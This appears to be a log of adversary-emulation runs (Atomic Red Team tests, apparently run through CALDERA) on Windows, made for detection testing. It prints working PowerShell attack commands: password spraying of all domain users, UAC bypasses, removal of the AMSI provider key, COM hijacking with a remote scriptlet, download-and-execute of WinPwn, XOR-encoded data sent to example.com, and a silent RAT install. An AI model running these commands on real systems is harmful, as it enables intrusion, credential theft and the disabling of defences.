            '"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\FileSystem" -Name '
            'LongPathsEnabled -PropertyType DWord -Value 1 -Force',
 'delegated': '2023-11-30T00:52:42Z',
 'description': 'This task recreates the steps taken by BlackByte ransomware '
                'before it worms to other machines via Powershell.  See '
                '"Preparing to Worm" section: '
                'https://redcanary.com/blog/blackbyte-ransomware/\n'
                'The steps are as follows:\n'
                '<ol>\n'
                '    <li>1. Elevate Local Privilege by disabling UAC Remote '
                'Restrictions</li>\n'
                '    <li>2. Enable OS to share network connections between '
                'different privilege levels</li>\n'
                '    <li>3. Enable long path values for file paths, names, and '
                'namespaces to ensure encryption of all file names and '
                'paths</li>\n'
                '</ol>\n'
                'The registry keys and their respective values will be created '
                'upon successful execution.\n',
 'executor': 'psh',
 'link_id': 'd82940da-f66f-43c0-b8e8-4691bfeb3bc6',
 'name': 'BlackByte Ransomware Registry Changes - Powershell',
 'pid': 2564,
 'plaintext_command': 'New-ItemProperty '
                      '"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" '
                      '-Name LocalAccountTokenFilterPolicy -PropertyType DWord '
                      '-Value 1 -Force; New-ItemProperty '
                      '"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" '
                      '-Name EnableLinkedConnections -PropertyType DWord '
                      '-Value 1 -Force; New-ItemProperty '
                      '"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\FileSystem" '
                      '-Name LongPathsEnabled -PropertyType DWord -Value 1 '
                      '-Force',
 'platform': 'windows',
 'run': '2023-11-30T00:53:19Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1110_003__credential-access__brute_force-_password_spraying__a59dbd1a2ac17d69455248e7d91231bc__trial_1

atomic_ordering: ['a59dbd1a2ac17d69455248e7d91231bc']
------------------------------
{'ability_id': 'a59dbd1a2ac17d69455248e7d91231bc',
 'agent_reported_time': '2023-11-11T13:09:47Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1110.003',
            'technique_name': 'Brute Force: Password Spraying'},
 'command': 'if ("NTLM".ToLower() -NotIn @("ntlm","kerberos")) {;   Write-Host '
            '"Only \'NTLM\' and \'Kerberos\' auth methods are supported";   '
            'exit 1; }; $DomainUsers = Get-ADUser -LDAPFilter '
            "'(&(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' "
            '-Server $env:UserDnsDomain | Select-Object -ExpandProperty '
            'SamAccountName; '
            '[System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") '
            '| Out-Null; $di = new-object '
            'System.DirectoryServices.Protocols.LdapDirectoryIdentifier("$env:UserDnsDomain",389); '
            '$DomainUsers | Foreach-Object {;   $user = $_;   $password = '
            "'P@ssw0rd!';   $credz = new-object "
            'System.Net.NetworkCredential($user, $password, '
            '"$env:UserDnsDomain");   $conn = new-object '
            'System.DirectoryServices.Protocols.LdapConnection($di, $credz, '
            '[System.DirectoryServices.Protocols.AuthType]::NTLM);   try '
            '{;     Write-Host " [-] Attempting ${password} on account '
            '${user}.";     $conn.bind();     Write-Host " [!] '
            '${user}:${password} are valid credentials!";   } catch {;     '
            'Write-Host $_.Exception.Message;   }; }; Write-Host "End of '
            'password spraying"',
 'delegated': '2023-11-29T21:38:34Z',
 'description': 'Attempt to brute force all Active Directory domain users with '
                'a single password (called "password spraying") on a domain '
                'controller, via LDAP, with NTLM or Kerberos\n'
                '\n'
                'Prerequisite: AD RSAT PowerShell module is needed and it must '
                'run under a domain user (to fetch the list of all domain '
                'users)\n',
 'executor': 'psh',
 'link_id': '84b237a9-8b44-408c-9a4a-44e96c1e6955',
 'name': 'Password spray all Active Directory domain users with a single '
         'password via LDAP against domain controller (NTLM or Kerberos)',
 'pid': 2004,
 'plaintext_command': 'if ("NTLM".ToLower() -NotIn @("ntlm","kerberos")) {;   '
                      'Write-Host "Only \'NTLM\' and \'Kerberos\' auth methods '
                      'are supported";   exit 1; }; $DomainUsers = Get-ADUser '
                      '-LDAPFilter '
                      "'(&(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' "
                      '-Server $env:UserDnsDomain | Select-Object '
                      '-ExpandProperty SamAccountName; '
                      '[System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") '
                      '| Out-Null; $di = new-object '
                      'System.DirectoryServices.Protocols.LdapDirectoryIdentifier("$env:UserDnsDomain",389); '
                      '$DomainUsers | Foreach-Object {;   $user = $_;   '
                      "$password = 'P@ssw0rd!';   $credz = new-object "
                      'System.Net.NetworkCredential($user, $password, '
                      '"$env:UserDnsDomain");   $conn = new-object '
                      'System.DirectoryServices.Protocols.LdapConnection($di, '
                      '$credz, '
                      '[System.DirectoryServices.Protocols.AuthType]::NTLM);   '
                      'try {;     Write-Host " [-] Attempting ${password} on '
                      'account ${user}.";     $conn.bind();     Write-Host " '
                      '[!] ${user}:${password} are valid credentials!";   } '
                      'catch {;     Write-Host $_.Exception.Message;   }; }; '
                      'Write-Host "End of password spraying"',
 'platform': 'windows',
 'run': '2023-11-29T21:39:25Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1098_002__persistence__account_manipulation-_additional_email_delegate_permissions__8f2c53299c608f1c5168dfda3561de50__trial_1

atomic_ordering: ['8f2c53299c608f1c5168dfda3561de50']
==============================
==============================
adversary_id: atomic__t1530__collection__data_from_cloud_storage_object__3b234c1e6518ce41f49be91a20ce45f7__trial_1

atomic_ordering: ['3b234c1e6518ce41f49be91a20ce45f7']
==============================
==============================
adversary_id: atomic__t1548_002__multiple__abuse_elevation_control_mechanism-_bypass_user_account_control__f782c9b7007a34343faec301b64e7435__trial_1

atomic_ordering: ['f782c9b7007a34343faec301b64e7435']
------------------------------
{'ability_id': 'f782c9b7007a34343faec301b64e7435',
 'agent_reported_time': '2023-11-11T13:09:30Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1548.002',
            'technique_name': 'Abuse Elevation Control Mechanism: Bypass User '
                              'Account Control'},
 'command': 'New-Item -Force -Path '
            '"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command" -Value '
            "'cmd.exe /c notepad.exe'; New-ItemProperty -Force -Path "
            '"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command" -Name '
            '"DelegateExecute"; Start-Process -FilePath '
            '$env:windir\\system32\\sdclt.exe; Start-Sleep -s 3',
 'delegated': '2023-12-02T12:50:23Z',
 'description': 'Bypasses User Account Control using a fileless method, '
                'registry only.\n'
                'Upon successful execution, sdclt.exe will spawn cmd.exe to '
                'spawn notepad.exe\n'
                '[Reference - '
                'sevagas.com](http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass)\n'
                'Adapted from [MITRE ATT&CK '
                'Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/stepFourteen_bypassUAC.ps1)\n',
 'executor': 'psh',
 'link_id': '1585f343-b115-4cfc-ae8a-41ccc521bc29',
 'name': 'Bypass UAC using sdclt DelegateExecute',
 'pid': 9520,
 'plaintext_command': 'New-Item -Force -Path '
                      '"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command" '
                      "-Value 'cmd.exe /c notepad.exe'; New-ItemProperty "
                      '-Force -Path '
                      '"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command" '
                      '-Name "DelegateExecute"; Start-Process -FilePath '
                      '$env:windir\\system32\\sdclt.exe; Start-Sleep -s 3',
 'platform': 'windows',
 'run': '2023-12-02T12:50:32Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1018__discovery__remote_system_discovery__587a8743222626915bb08b3e9e132b19__trial_1

atomic_ordering: ['587a8743222626915bb08b3e9e132b19']
------------------------------
{'ability_id': '587a8743222626915bb08b3e9e132b19',
 'agent_reported_time': '2023-11-11T13:10:40Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1018',
            'technique_name': 'Remote System Discovery'},
 'command': 'try { get-wmiobject -class ds_computer -namespace '
            'root\\directory\\ldap -ErrorAction Stop }; catch { $_; exit '
            '$_.Exception.HResult }',
 'delegated': '2023-11-27T07:05:35Z',
 'description': 'The following Atomic test will utilize get-wmiobject to '
                'enumerate Active Directory for Domain Controllers.\n'
                'Upon successful execution a listing of Systems from AD will '
                'output with their paths.\n'
                'Reference: '
                'https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1\n',
 'executor': 'psh',
 'link_id': '10c6d53e-cead-49e8-a090-41d609bb026b',
 'name': 'Get-WmiObject to Enumerate Domain Controllers',
 'pid': 212,
 'plaintext_command': 'try { get-wmiobject -class ds_computer -namespace '
                      'root\\directory\\ldap -ErrorAction Stop }; catch { $_; '
                      'exit $_.Exception.HResult }',
 'platform': 'windows',
 'run': '2023-11-27T07:06:23Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1606_002__credential-access__forge_web_credentials-_saml_token__502b7914aac58f15708500e3ec62526b__trial_1

atomic_ordering: ['502b7914aac58f15708500e3ec62526b']
==============================
==============================
adversary_id: atomic__t1027_004__defense-evasion__obfuscated_files_or_information-_compile_after_delivery__55b2c04e70a5711957e264b04e645e91__trial_1

atomic_ordering: ['55b2c04e70a5711957e264b04e645e91']
------------------------------
{'ability_id': '55b2c04e70a5711957e264b04e645e91',
 'agent_reported_time': '2023-11-11T13:10:12Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1027.004',
            'technique_name': 'Obfuscated Files or Information: Compile After '
                              'Delivery'},
 'command': 'Invoke-Expression "893687_T1027.004_DynamicCompile.exe"',
 'delegated': '2023-11-27T11:18:07Z',
 'description': 'When C# is compiled dynamically, a .cmdline file will be '
                'created as a part of the process. \n'
                'Certain processes are not typically observed compiling C# '
                'code, but can do so without touching disk. This can be used '
                'to unpack a payload for execution.\n'
                'The exe file that will be executed is named as '
                "T1027.004_DynamicCompile.exe is contained in the 'bin' folder "
                'of this atomic, and the source code to the file is in the '
                "'src' folder.\n"
                "Upon execution, the exe will print 'T1027.004 Dynamic "
                "Compile'.\n",
 'executor': 'psh',
 'link_id': '4e7a4d35-c96e-4319-81e6-cb8c156d5966',
 'name': 'Dynamic C# Compile',
 'pid': 8872,
 'plaintext_command': 'Invoke-Expression "893687_T1027.004_DynamicCompile.exe"',
 'platform': 'windows',
 'run': '2023-11-27T11:18:29Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1204_002__execution__user_execution-_malicious_file__ca3c058554276f34ac84b996af0caf0d__trial_1

atomic_ordering: ['ca3c058554276f34ac84b996af0caf0d']
==============================
==============================
adversary_id: atomic__t1046__discovery__network_service_discovery__e958169f1efe85a5a5ea7a77eba8c29e__trial_1

atomic_ordering: ['e958169f1efe85a5a5ea7a77eba8c29e']
------------------------------
{'ability_id': 'e958169f1efe85a5a5ea7a77eba8c29e',
 'agent_reported_time': '2023-11-11T13:10:04Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1046',
            'technique_name': 'Network Service Discovery'},
 'command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
            'iex(new-object '
            "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
            'MS17-10 -noninteractive -consoleoutput',
 'delegated': '2023-11-27T19:24:56Z',
 'description': 'Search for MS17-10 vulnerable Windows Servers in the domain '
                'using powerSQL function of WinPwn',
 'executor': 'psh',
 'link_id': '86fc8547-3723-48b1-9853-0497771bab87',
 'name': 'WinPwn - MS17-10',
 'pid': 9236,
 'plaintext_command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
                      'iex(new-object '
                      "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
                      'MS17-10 -noninteractive -consoleoutput',
 'platform': 'windows',
 'run': '2023-11-27T19:25:10Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1132_001__command-and-control__data_encoding-_standard_encoding__5fd6b6b635191898a202dc7c21aa6068__trial_1

atomic_ordering: ['5fd6b6b635191898a202dc7c21aa6068']
------------------------------
{'ability_id': '5fd6b6b635191898a202dc7c21aa6068',
 'agent_reported_time': '2023-11-11T13:10:09Z',
 'attack': {'tactic': 'command-and-control',
            'technique_id': 'T1132.001',
            'technique_name': 'Data Encoding: Standard Encoding'},
 'command': '$plaintext = '
            '([system.Text.Encoding]::UTF8.getBytes("Path\\n----\\nC:\\Users\\victim")); '
            '$key = "abcdefghijklmnopqrstuvwxyz123456"; $cyphertext =  @(); '
            'for ($i = 0; $i -lt $plaintext.Count; $i++) {;  $cyphertext += '
            '$plaintext[$i] -bxor $key[$i % $key.Length]; }; $cyphertext = '
            '[system.Text.Encoding]::UTF8.getString($cyphertext); '
            '[System.Net.ServicePointManager]::Expect100Continue = $false; '
            'Invoke-WebRequest -Uri example.com -Method POST -Body $cyphertext '
            '-DisableKeepAlive',
 'delegated': '2023-11-30T05:23:03Z',
 'description': 'XOR encodes the data with a XOR key.\n'
                'Reference - '
                'https://gist.github.com/loadenmb/8254cee0f0287b896a05dcdc8a30042f\n',
 'executor': 'psh',
 'link_id': '778a1b19-cf97-4b5f-90d0-fdb4c0f672b6',
 'name': 'XOR Encoded data.',
 'pid': 2564,
 'plaintext_command': '$plaintext = '
                      '([system.Text.Encoding]::UTF8.getBytes("Path\\n----\\nC:\\Users\\victim")); '
                      '$key = "abcdefghijklmnopqrstuvwxyz123456"; $cyphertext '
                      '=  @(); for ($i = 0; $i -lt $plaintext.Count; $i++) {;  '
                      '$cyphertext += $plaintext[$i] -bxor $key[$i % '
                      '$key.Length]; }; $cyphertext = '
                      '[system.Text.Encoding]::UTF8.getString($cyphertext); '
                      '[System.Net.ServicePointManager]::Expect100Continue = '
                      '$false; Invoke-WebRequest -Uri example.com -Method POST '
                      '-Body $cyphertext -DisableKeepAlive',
 'platform': 'windows',
 'run': '2023-11-30T05:23:21Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1033__discovery__system_owner,user_discovery__2bf75f949823305d3ea815c8e94e9ee3__trial_1

atomic_ordering: ['2bf75f949823305d3ea815c8e94e9ee3']
------------------------------
{'ability_id': '2bf75f949823305d3ea815c8e94e9ee3',
 'agent_reported_time': '2023-11-11T13:08:44Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1033',
            'technique_name': 'System Owner/User Discovery'},
 'command': '[System.Environment]::UserName | Out-File -FilePath '
            '.\\CurrentactiveUser.txt ; $env:UserName | Out-File -FilePath '
            '.\\CurrentactiveUser.txt -Append',
 'delegated': '2023-11-27T14:10:19Z',
 'description': 'Use the PowerShell environment variables to identify the '
                'current logged user.',
 'executor': 'psh',
 'link_id': 'bfa17f91-d569-4c67-8d59-fb6ab0eb169d',
 'name': 'User Discovery With Env Vars PowerShell Script',
 'pid': 9548,
 'plaintext_command': '[System.Environment]::UserName | Out-File -FilePath '
                      '.\\CurrentactiveUser.txt ; $env:UserName | Out-File '
                      '-FilePath .\\CurrentactiveUser.txt -Append',
 'platform': 'windows',
 'run': '2023-11-27T14:10:20Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1546_015__multiple__event_triggered_execution-_component_object_model_hijacking__2db3b2385ba856424bfe130f69fc0529__trial_1

atomic_ordering: ['2db3b2385ba856424bfe130f69fc0529']
------------------------------
{'ability_id': '2db3b2385ba856424bfe130f69fc0529',
 'agent_reported_time': '2023-11-11T13:10:45Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1546.015',
            'technique_name': 'Event Triggered Execution: Component Object '
                              'Model Hijacking'},
 'command': 'reg add "HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest" /ve /T '
            'REG_SZ /d "AtomicTest" /f; reg add '
            '"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest.1.00" /ve /T '
            'REG_SZ /d "AtomicTest" /f; reg add '
            '"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest\\CLSID" /ve /T '
            'REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f; reg add '
            '"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest.1.00\\CLSID" '
            '/ve /T REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f; reg '
            'add '
            '"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}" '
            '/f; reg add '
            '"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}" '
            '/ve /T REG_SZ /d "AtomicTest" /f; reg add '
            '"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\InprocServer32" '
            '/ve /T REG_SZ /d "C:\\WINDOWS\\system32\\scrobj.dll" /f; reg add '
            '"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\InprocServer32" '
            '/v "ThreadingModel" /T REG_SZ /d "Apartment" /f; reg add '
            '"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\ProgID" '
            '/ve /T REG_SZ /d "AtomicTest" /f; reg add '
            '"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\ScriptletURL" '
            '/ve /T REG_SZ /d '
            '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/src/TreatAs.sct" '
            '/f; reg add '
            '"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\VersionIndependentProgID" '
            '/ve /T REG_SZ /d "AtomicTest" /f; reg add '
            '"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}" '
            '/f; reg add '
            '"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\\TreatAs" '
            '/ve /T REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f; '
            'rundll32.exe -sta "AtomicTest"',
 'delegated': '2023-12-01T21:23:34Z',
 'description': 'This test first create a custom CLSID class pointing to the '
                'Windows Script Component runtime DLL. This DLL looks for the '
                'ScriptletURL key to get the location of the script to '
                'execute.\n'
                'Then, it hijacks the CLSID for the Work Folders Logon '
                'Synchronization to establish persistence on user logon by '
                "creating the 'TreatAs' with the malicious CLSID as default "
                'value. The\n'
                "test is validated by running 'rundll32.exe -sta "
                '"AtomicTest"\' to avoid logging out.\n'
                '\n'
                'References:\n'
                '\n'
                'https://youtu.be/3gz1QmiMhss?t=1251\n'
                '\n'
                'https://github.com/enigma0x3/windows-operating-system-archaeology',
 'executor': 'psh',
 'link_id': '077d35e7-f29d-4187-928e-a5931f7766dc',
 'name': 'COM hijacking via TreatAs',
 'pid': 380,
 'plaintext_command': 'reg add '
                      '"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest" /ve '
                      '/T REG_SZ /d "AtomicTest" /f; reg add '
                      '"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest.1.00" '
                      '/ve /T REG_SZ /d "AtomicTest" /f; reg add '
                      '"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest\\CLSID" '
                      '/ve /T REG_SZ /d '
                      '"{00000001-0000-0000-0000-0000FEEDACDC}" /f; reg add '
                      '"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest.1.00\\CLSID" '
                      '/ve /T REG_SZ /d '
                      '"{00000001-0000-0000-0000-0000FEEDACDC}" /f; reg add '
                      '"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}" '
                      '/f; reg add '
                      '"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}" '
                      '/ve /T REG_SZ /d "AtomicTest" /f; reg add '
                      '"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\InprocServer32" '
                      '/ve /T REG_SZ /d "C:\\WINDOWS\\system32\\scrobj.dll" '
                      '/f; reg add '
                      '"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\InprocServer32" '
                      '/v "ThreadingModel" /T REG_SZ /d "Apartment" /f; reg '
                      'add '
                      '"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\ProgID" '
                      '/ve /T REG_SZ /d "AtomicTest" /f; reg add '
                      '"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\ScriptletURL" '
                      '/ve /T REG_SZ /d '
                      '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/src/TreatAs.sct" '
                      '/f; reg add '
                      '"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\VersionIndependentProgID" '
                      '/ve /T REG_SZ /d "AtomicTest" /f; reg add '
                      '"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}" '
                      '/f; reg add '
                      '"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\\TreatAs" '
                      '/ve /T REG_SZ /d '
                      '"{00000001-0000-0000-0000-0000FEEDACDC}" /f; '
                      'rundll32.exe -sta "AtomicTest"',
 'platform': 'windows',
 'run': '2023-12-01T21:24:24Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1219__command-and-control__remote_access_software__d21a964d09837abede8966daf6ae46cf__trial_1

atomic_ordering: ['d21a964d09837abede8966daf6ae46cf']
------------------------------
{'ability_id': 'd21a964d09837abede8966daf6ae46cf',
 'agent_reported_time': '2023-11-11T13:10:05Z',
 'attack': {'tactic': 'command-and-control',
            'technique_id': 'T1219',
            'technique_name': 'Remote Access Software'},
 'command': 'Start-Process -Wait -FilePath '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\T1219_UltraViewer.exe" '
            '-Argument "/silent" -PassThru; Start-Process \'C:\\Program Files '
            "(x86)\\UltraViewer\\UltraViewer_Desktop.exe'",
 'delegated': '2023-12-01T06:30:38Z',
 'description': 'A recent trend by threat actors, once a foothold is '
                'established, maintain long term persistence using third party '
                'remote services such as UltraViewer to provide the operator '
                'with access to the network using legitimate services. \n',
 'executor': 'psh',
 'link_id': '47898457-2838-495e-bf26-88487805452d',
 'name': 'UltraViewer - RAT Execution',
 'pid': 9200,
 'plaintext_command': 'Start-Process -Wait -FilePath '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\T1219_UltraViewer.exe" '
                      '-Argument "/silent" -PassThru; Start-Process '
                      "'C:\\Program Files "
                      "(x86)\\UltraViewer\\UltraViewer_Desktop.exe'",
 'platform': 'windows',
 'run': '2023-12-01T06:30:50Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1560__collection__archive_collected_data__8cd2639cb742872b58a2356909628376__trial_1

atomic_ordering: ['8cd2639cb742872b58a2356909628376']
------------------------------
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1135__discovery__network_share_discovery__25b475e94dd2d70fcc66b2ce43c8f718__trial_1

atomic_ordering: ['25b475e94dd2d70fcc66b2ce43c8f718']
------------------------------
{'ability_id': '25b475e94dd2d70fcc66b2ce43c8f718',
 'agent_reported_time': '2023-11-11T13:08:45Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1135',
            'technique_name': 'Network Share Discovery'},
 'command': 'get-smbshare',
 'delegated': '2023-11-30T09:32:03Z',
 'description': 'Network Share Discovery utilizing PowerShell. The computer '
                'name variable may need to be modified to point to a different '
                'host\n'
                'Upon execution, avalaible network shares will be displayed in '
                'the powershell session\n',
 'executor': 'psh',
 'link_id': 'f6b093c7-db5e-4deb-98fb-992f3bd9e020',
 'name': 'Network Share Discovery PowerShell',
 'pid': 4316,
 'plaintext_command': 'get-smbshare',
 'platform': 'windows',
 'run': '2023-11-30T09:32:24Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__29797527e006f065df5c2d1f7b1b0b56__trial_1

atomic_ordering: ['29797527e006f065df5c2d1f7b1b0b56']
==============================
==============================
adversary_id: atomic__t1548_002__multiple__abuse_elevation_control_mechanism-_bypass_user_account_control__e7d20e7f0087f8a4234c1d1b7a228bb0__trial_1

atomic_ordering: ['e7d20e7f0087f8a4234c1d1b7a228bb0']
------------------------------
{'ability_id': 'e7d20e7f0087f8a4234c1d1b7a228bb0',
 'agent_reported_time': '2023-11-11T13:09:57Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1548.002',
            'technique_name': 'Abuse Elevation Control Mechanism: Bypass User '
                              'Account Control'},
 'command': '$orgValue =(Get-ItemProperty '
            'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System '
            '-Name ConsentPromptBehaviorAdmin).ConsentPromptBehaviorAdmin; '
            'Set-ItemProperty '
            'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System '
            '-Name ConsentPromptBehaviorAdmin -Value 0 -Type Dword -Force',
 'delegated': '2023-12-02T12:11:34Z',
 'description': 'Disable User Account Conrol (UAC) for admin by setting the '
                'registry key \n'
                'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ConsentPromptBehaviorAdmin '
                'to 0.\n'
                '\n'
                '[MedusaLocker '
                'Ransomware](https://cloudsek.com/technical-analysis-of-medusalocker-ransomware/), \n'
                '[Purple Fox '
                'Rootkit](https://blogs.blackberry.com/en/2022/01/threat-thursday-purple-fox-rootkit), \n'
                '[Avaddon '
                'Ransomware](https://blogs.blackberry.com/en/2021/06/threat-thursday-avaddon-ransomware-uses-ddos-attacks-as-triple-threat)\n',
 'executor': 'psh',
 'link_id': '8830ed07-3c96-4a87-9d27-4b152913ee8b',
 'name': 'Disable UAC admin consent prompt via ConsentPromptBehaviorAdmin '
         'registry key',
 'pid': 6640,
 'plaintext_command': '$orgValue =(Get-ItemProperty '
                      'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System '
                      '-Name '
                      'ConsentPromptBehaviorAdmin).ConsentPromptBehaviorAdmin; '
                      'Set-ItemProperty '
                      'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System '
                      '-Name ConsentPromptBehaviorAdmin -Value 0 -Type Dword '
                      '-Force',
 'platform': 'windows',
 'run': '2023-12-02T12:11:38Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__392e12d6a466407e28d1bb51cf0729bb__trial_1

atomic_ordering: ['392e12d6a466407e28d1bb51cf0729bb']
------------------------------
{'ability_id': '392e12d6a466407e28d1bb51cf0729bb',
 'agent_reported_time': '2023-11-11T13:09:56Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1562.001',
            'technique_name': 'Impair Defenses: Disable or Modify Tools'},
 'command': 'Remove-Item -Path '
            '"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}" '
            '-Recurse',
 'delegated': '2023-12-03T10:11:20Z',
 'description': 'With administrative rights, an adversary can remove the AMSI '
                'Provider registry key in HKLM\\Software\\Microsoft\\AMSI to '
                'disable AMSI inspection.\n'
                'This test removes the Windows Defender provider registry key. '
                'Upon execution, no output is displayed.\n'
                'Open Registry Editor and navigate to '
                '"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\" to verify '
                'that it is gone.\n',
 'executor': 'psh',
 'link_id': '871eafcd-62f2-47be-b6f8-49d6bb00270a',
 'name': 'AMSI Bypass - Remove AMSI Provider Reg Key',
 'pid': 6896,
 'plaintext_command': 'Remove-Item -Path '
                      '"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}" '
                      '-Recurse',
 'platform': 'windows',
 'run': '2023-12-03T10:11:27Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1592_001__reconnaissance__gather_victim_host_information-_hardware__53861bc51eb67cb9775c95b9e02ad141__trial_1

atomic_ordering: ['53861bc51eb67cb9775c95b9e02ad141']
------------------------------
{'ability_id': '53861bc51eb67cb9775c95b9e02ad141',
 'agent_reported_time': '2023-11-11T13:10:03Z',
 'attack': {'tactic': 'reconnaissance',
            'technique_id': 'T1592.001',
            'technique_name': 'Gather Victim Host Information: Hardware'},
